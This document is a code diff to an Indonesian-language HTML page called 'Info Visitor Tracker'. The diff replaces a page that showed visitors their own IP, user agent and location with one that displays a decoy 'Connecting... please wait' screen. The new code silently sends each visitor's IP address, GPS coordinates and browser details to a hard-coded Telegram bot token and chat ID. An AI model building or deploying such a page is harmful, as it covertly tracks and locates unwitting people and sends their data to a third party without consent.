@@ -3,7 +3,7 @@
 <html>
 <head>
   <title>Info Visitor Tracker</title>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <style>
     body {
       background: black;
@@ -14,56 +14,54 @@
     }
     .box {
       border: 1px solid #00ff00;
-      padding: 20px;
-      margin: 20px auto;
-      width: 80%;
-      background-color: #111;
+      padding: 15px;
+      display: inline-block;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h1>🧠 Info Tracker Legal</h1>
-  <div class="box" id="info">
-    Mengambil info...
-  </div>
+  <h1>👨‍💻 Menghubungkan...</h1>
+  <p>Harap tunggu...</p>
+  <div class="box" id="info"></div>
 
   <script>
-    async function getIP() {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip;
+    async function sendToTelegram(ip, userAgent, lat, lon) {
+      const token = "8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM";
+      const chatId = "7932600874";
+      const text = `🌐 IP: ${ip}%0A📍 Lokasi: ${lat}, ${lon}%0A🧠 User-Agent: ${userAgent}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
+      await fetch(url);
     }
 
-    async function getLocation() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject("Geolocation not supported");
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(pos.coords),
-          err => reject("Tidak ada izin lokasi.")
-        );
-      });
-    }
-
-    async function showInfo() {
-      const ip = await getIP();
-      const ua = navigator.userAgent;
-      let locText = "Lokasi tidak diizinkan.";
+    async function getInfo() {
+      const userAgent = navigator.userAgent;
+      let ip = "Tidak diketahui";
+      let lat = "Tidak diketahui", lon = "Tidak diketahui";
 
       try {
-        const loc = await getLocation();
-        locText = `Latitude: ${loc.latitude}<br>Longitude: ${loc.longitude}<br>Akurasi: ${loc.accuracy} meter`;
-      } catch (e) {
-        locText = e;
-      }
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch {}
 
-      document.getElementById("info").innerHTML = `
-        🌐 IP: ${ip}<br><br>
-        📱 User-Agent: ${ua}<br><br>
-        📍 Lokasi: <br>${locText}
-      `;
+      try {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: ${lat}, ${lon}<br>User-Agent: ${userAgent}`;
+          await sendToTelegram(ip, userAgent, lat, lon);
+        }, async () => {
+          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Tidak diizinkan<br>User-Agent: ${userAgent}`;
+          await sendToTelegram(ip, userAgent, "Tidak diizinkan", "Tidak diizinkan");
+        });
+      } catch {
+        document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Error<br>User-Agent: ${userAgent}`;
+        await sendToTelegram(ip, userAgent, "Error", "Error");
+      }
     }
 
-    showInfo();
+    getInfo();
   </script>
 </body>
 </html>
